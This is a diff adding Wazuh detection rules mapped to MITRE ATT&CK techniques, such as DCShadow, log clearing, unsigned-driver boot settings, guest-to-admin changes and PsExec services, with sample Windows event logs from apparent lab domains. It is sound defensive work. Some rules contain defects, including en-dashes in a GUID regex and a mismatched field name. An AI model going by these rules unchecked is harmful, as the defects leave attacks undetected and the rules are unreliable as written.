+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4826","version":"1","level":"0","task":"12288","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"1101699","processID":"520","threadID":"1508","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"Boot Configuration Data loaded."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-18","SubjectUserName":"-","SubjectDomainName":"-","SubjectLogonId":"0x3e7","LoadOptions":"-","AdvancedOptions":"%%1843","ConfigAccessPolicy":"%%1846","RemoteEventLogging":"%%1843","KernelDebug":"%%1843","VsmLaunchType":"%%1848","TestSigning":"%%1843","FlightSigning":"%%1843","DisableIntegrityChecks":"%%1843","HypervisorLoadOptions":"-","HypervisorLaunchType":"%%1848","HypervisorDebug":"%%1842"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4826","version":"1","level":"0","task":"12288","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"1101699","processID":"520","threadID":"1508","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"Boot Configuration Data loaded."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-18","SubjectUserName":"-","SubjectDomainName":"-","SubjectLogonId":"0x3e7","LoadOptions":"-","AdvancedOptions":"%%1843","ConfigAccessPolicy":"%%1846","RemoteEventLogging":"%%1843","KernelDebug":"%%1842","VsmLaunchType":"%%1848","TestSigning":"%%1843","FlightSigning":"%%1843","DisableIntegrityChecks":"%%1843","HypervisorLoadOptions":"-","HypervisorLaunchType":"%%1848","HypervisorDebug":"%%1843"}}}
+
+-->
+
+<!-- DEFENSE EVASION -->
+
+<!-- Detailed Directory Service Replication Auditing must be enabled -->
+<rule id="100280" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4928|4929</field>
+   <description>Mitre ATT&CK T1207, Defense Evasion, DCShadow, Check if the source of events is not a legitimate domain controller</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100281" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">1102</field>
+   <description>Mitre ATT&CK T1146 , Defense Evasion, Clear Command History, Audit security registry deleted</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100282" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">104</field>
+   <description>Mitre ATT&CK T1146 , Defense Evasion, Clear Command History, Audit system registry deleted</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100283" level="10">
+   <if_sid>60121</if_sid>
+   <field name="win.eventdata.eventID">4742|4738</field>
+   <field name="win.eventdata.SamAccountName">-</field> 
+   <field name="win.eventdata.DisplayName">-</field> 
+   <field name="win.eventdata.UserPrincipalName">-</field> 
+   <field name="win.eventdata.HomeDirectory">-</field> 
+   <field name="win.eventdata.HomePath">-</field> 
+   <field name="win.eventdata.ScriptPath">-</field> 
+   <field name="win.eventdata.ProfilePath">-</field> 
+   <field name="win.eventdata.UserWorkstations">-</field> 
+   <field name="win.eventdata.PasswordLastSet">-</field> 
+   <field name="win.eventdata.AccountExpires">-</field> 
+   <field name="win.eventdata.PrimaryGroupId">-</field>> 
+   <field name="win.eventdata.AllowedToDelegateTo">-</field> 
+   <field name="win.eventdata.OldUacValue">-</field> 
+   <field name="win.eventdata.NewUacValue">-</field> 
+   <field name="win.eventdata.UserAccountControl">-</field>> 
+   <field name="win.eventdata.UserParameters">-</field>
+   <field name="win.eventdata.SidHistory">-</field> 
+   <field name="win.eventdata.LogonHours">-</field>
+   <field name="win.eventdata.DnsHostName">-</field> 
+   <field name="win.eventdata.ServicePrincipalNames">-</field>
+   <description>Mitre ATT&CK T1222 , Defense Evasion, File and Directory Permissions Modification, DACL based attacks (manipulating ACEs and AD specific Objects's Rights)</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100284" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4826</field>
+   <field name="win.eventdata.DisableIntegrityCheck">%%1842</field>
+   <description>Mitre ATT&CK T1014 , Defense Evasion, Rootkit, Boot Configuration Data loaded allowing unsigned drivers to load</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100285" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4826</field>
+   <field name="win.eventdata.HypervisorDebug">%%1842</field>
+   <description>Mitre ATT&CK T1014 , Defense Evasion, Rootkit, Boot Configuration Data loaded allowing hypervisor debbuging</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100286" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4826</field>
+   <field name="win.eventdata.KernelDebug">%%1842</field>
+   <description>Mitre ATT&CK T1014 , Defense Evasion, Rootkit, Boot Configuration Data loaded allowing kernel debbuging</description>
+   <options>no_full_log</options>
+</rule>
+<!--
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4756","version":"0","level":"0","task":"13826","opcode":"0","keywords":"0x8000000000000000","systemTime":"2019-09-22T11:22:05.201727100Z","eventRecordID":"191029","processID":"624","threadID":"4452","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"A member was added to a security-enabled local group."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","MemberName":"-","MemberSid":"S-1-5-21","TargetUserName":"Administrators","TargetDomainName":"Builtin","TargetSid":"S-1-5-32-544","SubjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserName":"IEUser","SubjectDomainName":"MSEDGEWIN10","SubjectLogonId":"0x27a10f", "PrivilegeList":"-"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4732","version":"0","level":"0","task":"13826","opcode":"0","keywords":"0x8000000000000000","systemTime":"2019-09-22T11:22:05.201727100Z","eventRecordID":"191029","processID":"624","threadID":"4452","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"A member was added to a security-enabled local group."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","MemberName":"-","MemberSid":"S-1-5-21","TargetUserName":"Administrators","TargetDomainName":"Builtin","TargetSid":"S-1-5-32-544","SubjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserName":"IEUser","SubjectDomainName":"MSEDGEWIN10","SubjectLogonId":"0x27a10f", "PrivilegeList":"-"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4732","version":"0","level":"0","task":"13826","opcode":"0","keywords":"0x8000000000000000","systemTime":"2019-09-22T11:22:05.201727100Z","eventRecordID":"191029","processID":"624","threadID":"4452","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"A member was added to a security-enabled local group."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","MemberName":"-","MemberSid":"S-1-5-21-3461203602-4096304019-2269080069-501","TargetUserName":"Administrators","TargetDomainName":"Builtin","TargetSid":"S-1-5-32-544","SubjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserName":"IEUser","SubjectDomainName":"MSEDGEWIN10","SubjectLogonId":"0x27a10f", "PrivilegeList":"-"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4728","version":"0","level":"0","task":"13826","opcode":"0","keywords":"0x8000000000000000","systemTime":"2019-09-22T11:22:05.201727100Z","eventRecordID":"191029","processID":"624","threadID":"4452","channel":"Security","computer":"MSEDGEWIN10","severityValue":"AUDIT_SUCCESS","message":"A member was added to a security-enabled global group."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","MemberName":"-","MemberSid":"S-1-5-21","TargetUserName":"Administrators","TargetDomainName":"Builtin","TargetSid":"S-1-5-32-544","SubjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserName":"IEUser","SubjectDomainName":"MSEDGEWIN10","SubjectLogonId":"0x27a10f", "PrivilegeList":"-"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4742","version":"0","level":"0","task":"13825","opcode":"0","keywords":"0x8000000000000000","systemTime":"2019-05-08T03:00:37.586173100Z","eventRecordID":"203057","processID":"444","threadID":"1224","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"A member was added to a security-enabled local group."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ComputerAccountChange":"-", "TargetUserName":"ALICE$", "TargetDomainName":"insecurebank", "TargetSid":"S-1-5-21-738609754-2819869699-4189121830-1120","SubjectUserSid":"S-1-5-21-738609754-2819869699-4189121830-500","SubjectUserName":"Administrator","SubjectDomainName":"insecurebank","SubjectLogonId":"0x418a6fb","PrivilegeList":"-","SamAccountName":"-","DisplayName":"-","UserPrincipalName":"-","HomeDirectory":"-","HomePath":"-","ScriptPath":"-","ProfilePath":"-","UserWorkstations":"-","PasswordLastSet":"-","AccountExpires":"-","PrimaryGroupId":"-","AllowedToDelegateTo":"-","OldUacValue":"-","NewUacValue":"-","UserAccountControl":"-","UserParameters":"-","SidHistory":"-","LogonHours":"-","DnsHostName":"-","ServicePrincipalNames":"HOST/alice.insecurebank.local RestrictedKrbHost/alice.insecurebank.local HOST/ALICE RestrictedKrbHost/ALICE TERMSRV/alice.insecurebank.local TERMSRV/ALICE WSMAN/alice.insecurebank.local WSMAN/alice GC/alice.insecurebank.local/insecurebank.local E3514235-4B06-11D1-AB04-00C04FC2DCD2/ae9a3b29-01d1-4851-8ca8-e49cd3985e5b/insecurebank.local"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5145","version":"0","level":"0","task":"12811","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"267092","processID":"4","threadID":"284","channel":"Security","computer":"DESKTOP-D33AN6I","severityValue":"AUDIT_SUCCESS","message":"A network share object was checked to see whether client can be granted desired access."},"eventdata":{"subjectUserSid":"S-1-5-21-2635242741-4024004514-10403589-1001","subjectUserName":"Zenidd","subjectDomainName":"DESKTOP-D33AN6I","subjectLogonId":"0x6e03e","ObjectType":"File","IpAddress":"fe80::31ea:6c3c:f40d:1973","IpPort":"56926","ShareName":"\\test","ShareLocalPath":"\\??\\C:\\Documents","RelativeTargetName":"5501-ScheduledTask-WKSTN1-4020-stdout","AccessMask":"0x100081","AccessList":"%%1541 %%4417 %%4423","AccessReason":"%%1541: %%1801 D:(A;;FA;;;WD) %%4417: %%1801 D:(A;;FA;;;WD) %%4423: %%1801 D:(A;;FA;;;WD)"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4738","version":"0","level":"0","task":"13824","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"175408","processID":"520","threadID":"1508","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"A user account was changed."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","Dummy":"-","TargetUserName":"ksmith","TargetDomainName":"CONTOSO","TargetSid":"S-1-5-21-3457937927-2839227994-823803824-6609","SubjectUserSid":"S-1-5-21-3457937927-2839227994-823803824-1104","SubjectUserName":"dadmin","SubjectDomainName":"CONTOSO","SubjectLogonId":"0x30dc2","PrivilegeList":"-","SamAccountName":"-","DisplayName":"-","UserPrincipalName":"-","HomeDirectory":"-","HomePath":"-","ScriptPath":"-","ProfilePath":"-","UserWorkstations":"-","PasswordLastSet":"-","AccountExpires":"-","PrimaryGroupId":"-","AllowedToDelegateTo":"-","OldUacValue":"0x15","NewUacValue":"0x210","UserAccountControl":"%%2050 %%2089","UserParameters":"-","SidHistory":"-","LogonHours":"-"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4720","version":"0","level":"0","task":"13824","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"175408","processID":"520","threadID":"1508","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":" A user account was created."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","TargetUserName":"ksmith","TargetDomainName":"CONTOSO","TargetSid":"S-1-5-21-3457937927-2839227994-823803824-6609","SubjectUserSid":"S-1-5-21-3457937927-2839227994-823803824-1104","SubjectUserName":"dadmin","SubjectDomainName":"CONTOSO","SubjectLogonId":"0x30dc2","PrivilegeList":"-","SamAccountName":"ksmith$","DisplayName":"Ken ","UserPrincipalName":"ksmith@contoso.local","HomeDirectory":"-","HomePath":"-","ScriptPath":"-","ProfilePath":"-","UserWorkstations":"-","PasswordLastSet":"%%1794","AccountExpires":"%%1794","PrimaryGroupId":"513","AllowedToDelegateTo":"-","OldUacValue":"0x0","NewUacValue":"0x15","UserAccountControl":"%%2080 %%2082 %%2084","UserParameters":"-","SidHistory":"-","LogonHours":"%%1793"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4616","version":"1","level":"0","task":"12288","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"1101699","processID":"520","threadID":"1508","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"The system time was changed."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-21-3457937927-2839227994-823803824-1104","SubjectUserName":"dadmin","SubjectDomainName":"CONTOSO", "SubjectLogonId":"0x48f29","PreviousTime":"2015-10-09T05:04:30.000941900Z","NewTime":"2015-10-09T05:04:30.000000000Z","ProcessId":"0x1074", "ProcessName":"C:\\WindowsSystem32\\rundll.exe"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4697","version":"1","level":"0","task":"12288","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"1101699","processID":"520","threadID":"1508","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"The system time was changed."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-18","SubjectUserName":"WIN-GG82ULGC9GO$","SubjectDomainName":"CONTOSO","SubjectLogonId":"0x3e7","ServiceName":"AppHostSvc","ServiceFileName":"%windir%\\system32\\svchost.exe -k apphost","ServiceType":"0x20","ServiceStartType":"2","ServiceAccount":"localSystem"}}}
+
+{"win":{"system":{"providerName":"Service Control Manager","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"7045","version":"1","level":"0","task":"12288","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"1101699","processID":"520","threadID":"1508","channel":"System","computer":"DC1.insecurebank.local","severityValue":"","message":"A service was installed in the system."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ServiceName":"srcv","ImagePath":"\??\C:\Program Files (x86)\Symantec\Symantec Endpoint Protection\14.2.4814.1101.105\Bin64\SyDvCtrl64.sys","ServiceType":"controlador de modo kernel","StartType":"inicio por solicitud","AccountName":" "}}}
+
+{"win":{"system":{"providerName":"Service Control Manager","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"7045","version":"1","level":"0","task":"12288","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-04-27T19:33:50.134293600Z","eventRecordID":"1101699","processID":"520","threadID":"1508","channel":"System","computer":"DC1.insecurebank.local","severityValue":"","message":"A service was installed in the system."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","ServiceName":"PSEXECSVC","ImagePath":"\??\C:\Program Files (x86)\Symantec\Symantec Endpoint Protection\14.2.4814.1101.105\Bin64\SyDvCtrl64.sys","ServiceType":"controlador de modo kernel","StartType":"inicio por solicitud","AccountName":" "}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"5145","version":"0","level":"0","task":"12811","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-12-04T12:45:38.962884600Z","eventRecordID":"267092","processID":"4","threadID":"284","channel":"Security","computer":"DESKTOP-D33AN6I","severityValue":"AUDIT_SUCCESS","message":"A network share object was checked to see whether client can be granted desired access."},"eventdata":{"subjectUserSid":"S-1-5-21-2635242741-4024004514-10403589-1001","subjectUserName":"Zenidd","subjectDomainName":"DESKTOP-D33AN6I","subjectLogonId":"0x6e03e","ObjectType":"File","IpAddress":"fe80::31ea:6c3c:f40d:1973","IpPort":"56926","ShareName":"\\test","ShareLocalPath":"\\??\\C:\\Documents","RelativeTargetName":"5501-WKSTN1-4020-stdout","AccessMask":"0x100081","AccessList":"%%1541 %%4417 %%4423","AccessReason":"%%1541: %%1801 D:(A;;FA;;;WD) %%4417: %%1801 D:(A;;FA;;;WD) %%4423: %%1801 D:(A;;FA;;;WD)"}}}
+
+ -->
+<!-- PERSISTENCE -->
+
+<!--Administrators S-1-5-32-544|Domain Admins S-1-5-32-512|Server operators S-1-5-32-549|Enterprise Admins S-1-5-32-519|Schema Admins S-1-5-32-518 -->
+
+<!-- collision with 60151 -->
+<rule id="100300" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4756</field>
+   <description>Mitre ATT&CK T1098, Persistence, Account Manipulation,  A member was added to a security-enabled universal group</description>
+   <options>no_full_log</options>
+</rule>
+<!-- Collision with rule 60144 -->
+<rule id="100301" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4732</field>
+   <field name="win.eventdata.TargetSid">(S-1-5-32-544)|(S-1-5-32-512)|(S-1-5-32-549)|(S-1-5-32-519)|(S-1-5-32-518)</field>
+   <description>Mitre ATT&CK T1098, Account Manipulation , Persistence,  A member was added to a security-enabled local group</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100302" level="10">
+   <if_sid>100301</if_sid>
+   <field name="win.system.eventID">4732</field>
+   <field name="win.eventdata.MemberSid">S-1-5-21-(\S+)-501</field>
+   <field name="win.eventdata.TargetSid">(S-1-5-32-544)</field>
+   <description>Mitre ATT&CK T1098, Persistence, Account Manipulation , A member was added to a security-enabled local group, Guest added to admins</description>
+   <options>no_full_log</options>
+</rule>
+<!-- Collision with rule 60141 -->
+<rule id="100303" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4728</field>
+   <description>Mitre ATT&CK T1098, Persistence, Account Manipulation,  A member was added to a security-enabled global group</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100304" level="10">
+   <if_sid>60121</if_sid>
+   <field name="win.system.eventID">4742</field>
+   <field name="win.eventdata.ServicePrincipalNames">(\.*)\sGC(\.*)\sE3514235–4B06–11D1-AB04–00C04FC2DCD2(\.*)</field>
+   <description>Mitre ATT&CK T1098, Persistence, Account Manipulation , Computer (Not domain controller) SPN Changes, DCShadow impersonating domain controller</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100305" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">5145</field>
+   <field name="win.eventdata.RelativeTargetName">(\.*)ScheduledTask(\.*)</field>
+   <field name="win.eventdata.AccessList">(\.*)%%4417(\.*)</field>
+   <description>Mitre ATT&CK T1168, Persistence, Execution, Local Job Scheduling, GPO level scheduled task</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100306" level="10">
+   <if_sid>60110</if_sid>
+   <field name="win.system.eventID">4738</field>
+   <field name="win.eventdata.OldUacValue">0x10|0x11|0x15</field>
+   <field name="win.eventdata.NewUacValue">0x210</field>
+   <description>Mitre ATT&CK T1098 , Persistence, Account Manipulation, User account set with password to never expire </description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100307" level="10">
+   <if_sid>60109</if_sid>
+   <field name="win.system.eventID">4720</field>
+   <field name="win.eventdata.SamAccountName">(\.*)\$</field>
+   <description>Mitre ATT&CK T1136 , Persistence, Create Account, User account created with a name that mimic a machine account</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100308" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4616</field>
+   <field name="win.eventdata.ProcessName">(\.*)rundll.exe</field>
+   <description>Mitre ATT&CK T1209, Persistence, Time Providers, Time change outside the normal Windows Time Service.</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100309" level="8">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4697</field>
+   <description>Mitre ATT&CK T1050, Persistence, New Service, A service was installed in the system</description>
+   <options>no_full_log</options>
+</rule>
+<rule id="100310" level="8">
+    <if_sid>61100</if_sid>
+    <field name="win.system.eventID">^7045$</field>
+    <description>Mitre ATT&CK T1050, Persistence, New Service, A service was installed in the system</description>
+    <options>no_full_log</options>
+</rule>
+<rule id="100311" level="8">
+    <if_sid>61100</if_sid>
+    <field name="win.system.eventID">^7045$</field>
+	<field name="win.eventdata.ServiceName">PSEXECSVC</field>
+    <description>Mitre ATT&CK T1050, Persistence, New Service, PSEXEC Service created</description>
+    <options>no_full_log</options>
+</rule>
+<rule id="100312" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">5145</field>
+   <field name="win.eventdata.RelativeTargetName">\.*-stdin$|-stdout$|-stderr$</field>
+   <description>Mitre ATT&CK T1050, Persistence, New Service, PSEXEC Service created</description>
+   <options>no_full_log</options>
+</rule>
+
+<!--
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4964","version":"0","level":"0","task":"14080","opcode":"0","keywords":"0x8020000000000000","systemTime":"2015-09-30T00:11:56.547696700Z","eventRecordID":"1048009","processID":"520","threadID":"528","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"Special groups have been assigned to a new logon."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-21-3457937927-2839227994-823803824-1104","SubjectUserName":"dadmin","SubjectDomainName":"CONTOSO","SubjectLogonId":"0xd972e","LogonGuid":"{00000000-0000-0000-0000-000000000000}","TargetUserSid":"S-1-5-21-3457937927-2839227994-823803824-500","TargetUserName":"ladmin","TargetDomainName":"CONTOSO","TargetLogonId":"0x139faf","TargetLogonGuid":"{B03B6192-09AE-E77F-DD10-2DC430766040}","SidList":"%{S-1-5-21-3457937927-2839227994-823803824-512}"}}}
+-->
+<!-- INITIAL ACCESS -->
+
+<!-- The SpecialGroups string must be added first to HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Audit for auditing of Special Groups to take place. -->
+<rule id="100320" level="10">
+   <if_sid>60103</if_sid>
+   <field name="win.system.eventID">4964</field>
+   <description>Mitre ATT&CK T1078, Initial Access, Special groups have been assigned to a new logon</description>
+   <options>no_full_log</options>
+</rule>
+<!--
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4771","version":"0","level":"0","task":"14339","opcode":"0","keywords":"0x8020000000000000","systemTime":"2015-09-30T00:11:56.547696700Z","eventRecordID":"1048009","processID":"520","threadID":"528","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_FAILURE","message":"Kerberos pre-authentication failed."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","TargetUserName":"dadmin","TargetSid":"S-1-5-21-3457937927-2839227994-823803824-1104","ServiceName":"krbtgt/CONTOSO.LOCAL","TicketOptions":"0x40810010","Status":"0x18","PreAuthType":"15","IpAddress":"::ffff:10.0.0.12","IpPort":"49254","CertIssuerName":"","CertSerialNumber":"","CertThumbprint":""}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4771","version":"0","level":"0","task":"14339","opcode":"0","keywords":"0x8020000000000000","systemTime":"2015-09-30T00:11:56.547696700Z","eventRecordID":"1048009","processID":"520","threadID":"528","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_FAILURE","message":"Kerberos pre-authentication failed."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","TargetUserName":"dadmin","TargetSid":"S-1-5-21-3457937927-2839227994-823803824-1104","ServiceName":"krbtgt/CONTOSO.LOCAL","TicketOptions":"0x40810010","Status":"0x18","PreAuthType":"15","IpAddress":"","IpPort":"49254","CertIssuerName":"","CertSerialNumber":"","CertThumbprint":""}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4625","version":"0","level":"0","task":"14339","opcode":"0","keywords":"0x8020000000000000","systemTime":"2015-09-30T00:11:56.547696700Z","eventRecordID":"1048009","processID":"520","threadID":"528","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_FAILURE","message":"An account failed to log on."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-18","SubjectUserName":"DC01$","SubjectDomainName":"CONTOSO","SubjectLogonId":"0x3e7","TargetUserSid":"S-1-0-0","TargetUserName":"Auditor","TargetDomainName":"CONTOSO","Status":"0xC000006A","FailureReason":"%%2307","SubStatus":"0x0","LogonType":"2","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"DC01","TransmittedServices":"-","LmPackageName":"-","KeyLength":"0","ProcessId":"0x1bc","ProcessName":"C:\\Windows\\System32\\winlogon.exe","IpAddress":"127.0.0.1","IpPort":"0"}}}
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4625","version":"0","level":"0","task":"14339","opcode":"0","keywords":"0x8020000000000000","systemTime":"2015-09-30T00:11:56.547696700Z","eventRecordID":"1048009","processID":"520","threadID":"528","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_FAILURE","message":"An account failed to log on."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-18","SubjectUserName":"DC01$","SubjectDomainName":"CONTOSO","SubjectLogonId":"0x3e7","TargetUserSid":"S-1-0-0","TargetUserName":"Auditor","TargetDomainName":"CONTOSO","Status":"0xC000006A","FailureReason":"%%2307","SubStatus":"0x0","LogonType":"2","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate","WorkstationName":"DC01","TransmittedServices":"-","LmPackageName":"-","KeyLength":"0","ProcessId":"0x1bc","ProcessName":"C:\\Windows\\System32\\winlogon.exe","IpAddress":"","IpPort":"0"}}}
+
+-
+
+{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4662","version":"0","level":"0","task":"14080","opcode":"0","keywords":"0x8020000000000000","systemTime":"2019-05-08T02:10:43.487217000","eventRecordID":"202793","processID":"444","threadID":"463","channel":"Security","computer":"DC1.insecurebank.local","severityValue":"AUDIT_SUCCESS","message":"An operation was performed on an object."},"eventdata":{"subjectUserSid":"S-1-5-21-3461203602-4096304019-2269080069-1000","SubjectUserSid":"S-1-5-21-738609754-2819869699-4189121830-500","SubjectUserName":"Administrator","SubjectDomainName":"insecurebank","SubjectLogonId":"0x40c6511","ObjectServer":"DS","ObjectType":"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}","ObjectName":"%{c6faf700-bfe4-452a-a766-424f84c29583}","OperationType":"Object Access","HandleId":"0x0","AccessList":"%%7688","AccessMask":"0x100","Properties":"%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}","AdditionalInfo":"-","AdditionalInfo2":""}}}
+
